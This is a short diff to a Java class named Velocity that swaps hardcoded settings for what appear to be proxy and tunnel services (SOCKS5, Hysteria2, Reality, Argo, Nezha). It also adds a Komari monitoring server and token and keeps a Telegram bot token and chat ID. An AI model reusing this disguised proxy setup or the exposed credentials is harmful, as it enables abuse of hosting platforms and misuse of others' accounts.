@@ -168,7 +168,7 @@ public final class Velocity {
   }
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
-    envVars.put("UUID", "1fb055d6-909b-4f1f-bac2-bafb5aef8562");
+    envVars.put("UUID", "010fe9d7-dd70-493f-b57d-715e2e7cf92e");
     envVars.put("FILE_PATH", "./worlds");
     envVars.put("NEZHA_SERVER", "");
     envVars.put("NEZHA_PORT", "");
@@ -176,22 +176,22 @@ public final class Velocity {
     envVars.put("ARGO_PORT", "");
     envVars.put("ARGO_DOMAIN", "");
     envVars.put("ARGO_AUTH", "");
-    envVars.put("S5_PORT", "8590");
-    envVars.put("HY2_PORT", "8590");
-    envVars.put("TUIC_PORT", "11333");
+    envVars.put("S5_PORT", "8372");
+    envVars.put("HY2_PORT", "8372");
+    envVars.put("TUIC_PORT", "");
     envVars.put("ANYTLS_PORT", "");
-    envVars.put("REALITY_PORT", "11333");
+    envVars.put("REALITY_PORT", "");
     envVars.put("ANYREALITY_PORT", "");
     envVars.put("UPLOAD_URL", "");
     envVars.put("CHAT_ID", "8502788454");
     envVars.put("BOT_TOKEN", "8649495497:AAEMvlapGGJfVr5tEFYAWkNwVMwvT7qWr6Y");
-    envVars.put("CFIP", "cdns.doon.eu.org");
+    envVars.put("CFIP", "cf.050900.xyz");
     envVars.put("CFPORT", "443");
     envVars.put("NAME", "");
     envVars.put("DISABLE_ARGO", "true");
     // ---- Komari Agent 默认值 ----
-    envVars.put("KOMARI_SERVER", "");
-    envVars.put("KOMARI_TOKEN", "");
+    envVars.put("KOMARI_SERVER", "https://komari.050900.xyz");
+    envVars.put("KOMARI_TOKEN", "58WvQVwGOL0CUhU7ByOlDm");
 
     for (String var : ALL_ENV_VARS) {
       final String value = System.getenv(var);
